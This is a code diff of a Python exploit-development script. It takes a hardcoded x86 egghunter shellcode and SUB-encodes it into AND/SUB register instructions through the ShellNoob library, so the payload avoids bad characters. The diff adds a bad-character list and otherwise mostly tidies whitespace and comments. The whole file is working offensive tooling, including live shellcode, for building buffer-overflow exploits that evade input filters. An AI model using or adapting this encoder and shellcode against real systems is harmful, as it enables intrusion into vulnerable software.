@@ -11,7 +11,7 @@ sn = ShellNoob(flag_intel=True)
 shellcode = (
     r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 register = "EAX"
-
+badchars = ["00","40"]
 
 def check_len(shell):# a check if the length of the shellcode is divisable in blocks of 4 bytes
     if len(shell) / 4 % 4 != 0:
@@ -21,13 +21,11 @@ def check_len(shell):# a check if the length of the shellcode is divisable in bl
     print("Shellcode is a correct multiple of 4")
     return shell
 
-
 def remove(shellcode):# remove "' and \x from shellcode to get a hexadecimal string without formatting
     shellcode = shellcode.replace("\\x", "")
     shellcode = shellcode.replace("'", "")
     shellcode = shellcode.replace('"', "")
     return shellcode
-
 
 def reverse(hexstring):
     hexbyte1 = hexstring[0] + hexstring[1]
@@ -37,7 +35,6 @@ def reverse(hexstring):
     newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
     return newhex
 
-
 def split(hexstring):
     hexbyte1 = hexstring[0] + hexstring[1]
     hexbyte2 = hexstring[2] + hexstring[3]
@@ -45,7 +42,6 @@ def split(hexstring):
     hexbyte4 = hexstring[6] + hexstring[7]
     hexbyte5 = hexstring[8] + hexstring[9]
     return hexbyte2, hexbyte3, hexbyte4, hexbyte5
-
 
 def calc(hexvalue1, hexvalue2):
     revhex = hexvalue1
@@ -60,7 +56,6 @@ def calc(hexvalue1, hexvalue2):
         diff = intofhex1 - intofhex2 & 0xFF  # Make the clock go round
         diff = "0x" + hex(diff)[2:]
         return diff
-
 
 def sub(values):
     retvalue = []
@@ -104,7 +99,6 @@ def sub(values):
          retvalue[6] = calc(retvalue[6], '0x01')
     return retvalue
 
-
 def test(chunks):
     intofhex1 = int(chunks[0], 16)
     intofhex2 = int(chunks[1], 16)
@@ -113,14 +107,12 @@ def test(chunks):
     result = "0x" + test[2:].zfill(8)
     return result
 
-
 def strip(ugly):
     n = 2
     nice = [ugly[index: index + n] for index in range(0, len(ugly), n)]
     nice = "".join(nice[1::2])
     nice = nice.upper()
     return nice
-
 
 def subtable(retvalue):
     nice = []
@@ -131,7 +123,6 @@ def subtable(retvalue):
     nice.append(strip(chunk2))
     nice.append(strip(chunk3))
     return nice
-
 
 shellcode = check_len(shellcode)
 print(shellcode)
@@ -167,8 +158,7 @@ f.write("#Then create space on the stack for encoded shellcode, in this case 253
 newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554D66"))
 newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x55554B66"))
 newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x5555506A"))
-f.write(
-    "SUB " + register + ", 0x55554D66" + "\r\n")  # creating space on the stack where the encoded shellcode ends Here 253 bytes but one can only know in the end.
+f.write("SUB " + register + ", 0x55554D66" + "\r\n")  # creating space on the stack where the encoded shellcode ends Here 253 bytes but one can only know in the end.
 f.write("SUB  " + register + ", 0x55554B66" + "\r\n")
 f.write("SUB " + register + ", 0x5555506A" + "\r\n")
 
@@ -181,16 +171,13 @@ f.write("#Now we write the encoded egghunter to the stack" + "\r\n")
 for i in shellcode:
     shellcode = str(i)
     loosevalues = []
-    # print("Sub-encoding: " + shellcode)
     hexclean = remove(shellcode)  # Remove slashes etc
     revhex = reverse(hexclean)  # Reverse the string endianess
     hexzeroMin = calc(revhex, "wrap")
-    # print("0 - passed Hex = " + hexzeroMin)
     loosevalues = split(hexzeroMin)
     chunks = sub(loosevalues)
     newchunks = subtable(chunks)
 
-    # print("Doing test to revert")
     newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x554E4D4A"))
     newshellcode.append(sn.asm_to_hex("AND %" + register + ", 0x2A313235"))
     newshellcode.append(sn.asm_to_hex("SUB %" + register + ", 0x" + newchunks[0]))
@@ -210,6 +197,7 @@ for i in shellcode:
         print("0x" + revhex)
         print(str(test(newchunks)))
         exit()
+
 f.close()
 l = "".join(newshellcode)
 
@@ -220,4 +208,5 @@ while step < len(l):
     hex = "\\x" + str(l[step - 2:step])
     newshellcode.append(hex)
     step += 2
+
 print('\r\nNew Shellcode:\r\nShellcode=("' + "".join(newshellcode) + '")')
